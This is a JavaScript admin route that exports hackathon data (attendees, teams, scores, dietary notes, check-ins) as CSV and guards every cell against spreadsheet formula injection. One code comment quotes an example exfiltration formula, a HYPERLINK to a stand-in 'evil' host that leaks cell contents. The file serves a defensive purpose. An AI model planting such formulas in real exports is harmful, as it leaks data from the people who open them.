import { requireAdmin } from "../../../../lib/auth";
import { exportRows } from "../../../../lib/ops";

const EXPORT_COLUMNS = {
  attendees: ["id", "name", "handle", "email", "track", "dietary", "registered_at"],
  teams: [
    "id",
    "name",
    "slug",
    "member_count",
    "members",
    "submission_id",
    "project",
    "submission_status",
    "submitted_at",
  ],
  submissions: [
    "id",
    "team_id",
    "team_name",
    "project",
    "track",
    "category",
    "status",
    "live_url",
    "repo_url",
    "submitted_at",
    "updated_at",
  ],
  scores: [
    "submission_id",
    "project",
    "team_name",
    "judge_id",
    "judge",
    "shipped",
    "receipts",
    "growth",
    "craft",
    "submitted_at",
    "updated_at",
  ],
  dietary: ["id", "name", "handle", "email", "dietary", "registered_at"],
  checkins: [
    "user_id",
    "name",
    "handle",
    "email",
    "day",
    "checked_in_at",
    "checked_in_by",
    "checked_in_by_name",
  ],
};

/* Every column here carries text somebody else typed — a dietary
   note, a team name, a submission's receipts. Excel, Sheets and
   Numbers all treat a cell beginning with = + - @ (or a leading tab
   or carriage return) as a formula, so
   `=HYPERLINK("http://evil/?"&A1,"hi")` in a dietary field becomes a
   live exfiltration link the moment an admin opens the export.

   Quoting alone doesn't stop it — the quotes are stripped on parse.
   The fix is a leading apostrophe, which those applications read as
   "this is text" and don't display. */
const FORMULA_START = /^[=+\-@\t\r]/;

function csvCell(value) {
  if (value === null || value === undefined) return "";

  /* A timestamptz arrives as a Date, and String() on one gives
     "Mon Jul 27 2026 23:22:49 GMT-0700 (Mountain Standard Time)" —
     which no spreadsheet will sort and no script will parse. ISO is
     the only format that does both. */
  if (value instanceof Date) return value.toISOString();

  let cell = String(value);
  if (FORMULA_START.test(cell)) cell = `'${cell}`;
  if (!/[",\r\n]/.test(cell)) return cell;
  return `"${cell.replaceAll('"', '""')}"`;
}

function noStoreHeaders() {
  return {
    "Cache-Control": "private, no-store",
    "X-Content-Type-Options": "nosniff",
    "X-Robots-Tag": "noindex, nofollow",
  };
}

export async function GET(request) {
  await requireAdmin("/admin/ops");

  const { searchParams } = new URL(request.url);
  const type = searchParams.get("type");
  const columns = EXPORT_COLUMNS[type];

  if (!columns) {
    return new Response("Unsupported export type.\n", {
      status: 400,
      headers: {
        ...noStoreHeaders(),
        "Content-Type": "text/plain; charset=utf-8",
      },
    });
  }

  const rows = await exportRows(type);
  const csvRows = [
    columns.map(csvCell).join(","),
    ...(Array.isArray(rows)
      ? rows.map((row) => columns.map((column) => csvCell(row?.[column])).join(","))
      : []),
  ];
  const csv = `${csvRows.join("\r\n")}\r\n`;

  return new Response(csv, {
    headers: {
      ...noStoreHeaders(),
      "Content-Type": "text/csv; charset=utf-8",
      "Content-Disposition": `attachment; filename="ship-ai-${type}.csv"`,
    },
  });
}
